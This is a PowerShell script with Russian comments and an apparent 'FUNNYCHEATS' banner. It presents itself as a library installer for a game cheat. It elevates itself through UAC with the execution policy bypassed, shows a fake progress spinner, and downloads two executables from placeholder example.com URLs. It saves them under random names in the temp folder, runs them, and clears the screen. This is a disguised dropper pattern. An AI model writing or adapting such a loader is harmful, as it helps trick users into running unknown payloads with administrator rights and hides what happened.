# =========================
# ПРОВЕРКА НА АДМИНИСТРАТОРА
# =========================

$isAdmin = (
    [Security.Principal.WindowsPrincipal]
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)

# ЕСЛИ НЕ АДМИН → ПЕРЕЗАПУСК С UAC
if (-not $isAdmin) {

    Start-Process powershell `
        -Verb RunAs `
        -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""

    exit
}

# =========================
# ОСНОВНОЙ КОД
# =========================

Clear-Host

Write-Host @'
                                                                                                          
 ▄▄▄▄▄▄▄ ▄▄▄  ▄▄▄ ▄▄▄    ▄▄▄ ▄▄▄    ▄▄▄ ▄▄▄   ▄▄▄  ▄▄▄▄▄▄▄ ▄▄▄   ▄▄▄  ▄▄▄▄▄▄▄   ▄▄▄▄   ▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄ 
███▀▀▀▀▀ ███  ███ ████▄  ███ ████▄  ███ ███   ███ ███▀▀▀▀▀ ███   ███ ███▀▀▀▀▀ ▄██▀▀██▄ ▀▀▀███▀▀▀ █████▀▀▀ 
███▄▄    ███  ███ ███▀██▄███ ███▀██▄███ ▀███▄███▀ ███      █████████ ███▄▄    ███  ███    ███     ▀████▄  
███▀▀    ███▄▄███ ███  ▀████ ███  ▀████   ▀███▀   ███      ███▀▀▀███ ███      ███▀▀███    ███       ▀████ 
███      ▀██████▀ ███    ███ ███    ███    ███    ▀███████ ███   ███ ▀███████ ███  ███    ███    ███████▀
'@ -ForegroundColor Magenta

Write-Host ""
Write-Host "Скачивание библиотек пожалуйста подождите !" `
    -ForegroundColor Yellow

# =========================
# СПИННЕР
# =========================

$spinner = '|','/','-','\'

for ($i = 0; $i -lt 20; $i++) {

    $idx = $i % $spinner.Length

    Write-Host "`r $($spinner[$idx])" `
        -NoNewline `
        -ForegroundColor White

    Start-Sleep -Milliseconds 100
}

Write-Host ""
Write-Host "Установка библиотек!" -ForegroundColor Blue

# =========================
# ГЕНЕРАЦИЯ СЛУЧАЙНЫХ ИМЁН
# =========================

$chars = [char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

$randomName1 = -join (
    1..6 | ForEach-Object {
        $chars | Get-Random
    }
)

$randomName2 = -join (
    1..6 | ForEach-Object {
        $chars | Get-Random
    }
)

$temp = $env:TEMP

# =========================
# ПУТИ К ФАЙЛАМ
# =========================

$lib  = "$temp\$randomName1.exe"
$libs = "$temp\$randomName2.exe"

Write-Host ""
Write-Host "Загрузка файлов..." -ForegroundColor Cyan

# =========================
# СКАЧИВАНИЕ
# =========================

Invoke-WebRequest `
    "https://example.com/lib.exe" `
    -OutFile $lib

Invoke-WebRequest `
    "https://example.com/libs.exe" `
    -OutFile $libs

Write-Host ""
Write-Host "Файлы успешно загружены!" `
    -ForegroundColor Green

# =========================
# ЗАПУСК
# =========================

Write-Host ""
Write-Host "Запуск установщиков..." `
    -ForegroundColor Cyan

Start-Process $lib -Wait

Start-Sleep -Seconds 2

Start-Process $libs -Wait

# =========================
# ФИНАЛ
# =========================

Write-Host ""
Write-Host "Успешно установились все библиотеки" `
    -ForegroundColor Green

Write-Host ""
Write-Host "Окно будет очищено через 5 секунд" `
    -ForegroundColor Yellow

Start-Sleep -Seconds 5

Clear-Host
